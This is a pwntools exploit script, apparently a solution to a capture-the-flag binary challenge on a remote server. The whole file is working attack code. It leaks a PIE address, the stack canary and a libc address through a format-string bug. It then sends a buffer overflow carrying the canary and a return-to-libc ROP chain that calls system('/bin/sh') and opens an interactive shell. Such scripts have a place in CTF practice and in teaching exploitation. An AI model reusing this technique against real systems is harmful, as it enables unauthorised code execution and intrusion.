#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./chall_patched', checksec=False)
context.terminal = ['alacritty', '-e', 'sh', '-c']

#io = process(level='error')
io = remote('34.159.103.1', 30124)

io.sendlineafter(b'$ ', '%17$p %9$p'.encode())

recv = io.recvline()

leak = int(recv.split()[0], 16)

elf.address = leak - 0x12e4
print(f'piebase: {hex(elf.address)}')

canary = int(recv.split()[1][:-4], 16)
print(f'canary: {hex(canary)}')

printf = int(recv.decode().split()[-1], 16)
print(f'printf: {hex(printf)}')

libc = ELF('./libc-2.31.so', checksec=False)

libc.address = printf - 0x61c90
print(f'libc: {hex(libc.address)}')

pop_rdi_rbp = elf.symbols.ROP + 9
pop_rax_rbp = elf.symbols.ROPME + 9
pop_rbx_rbp = elf.symbols.ROPMEE + 9
pop_rcx_rbp = elf.symbols.ROPMEEE + 9
pop_rdx_rbp = elf.symbols.ROPMEEEE + 9
pop_rsi_rbp = elf.symbols.ROPMEEEEE + 9

#gdb.attach(io, gdbscript=f'''
#break *ROPME+9
#c
#''')

payload = flat({
    24: [
        canary,
        b'A' * 8,
        #next(libc.search(asm('ret'))),
        pop_rdi_rbp,
        next(libc.search(b'/bin/sh')),
        0,
        libc.symbols.system,
    ]
})

io.sendlineafter(b'$ ', payload)

io.interactive()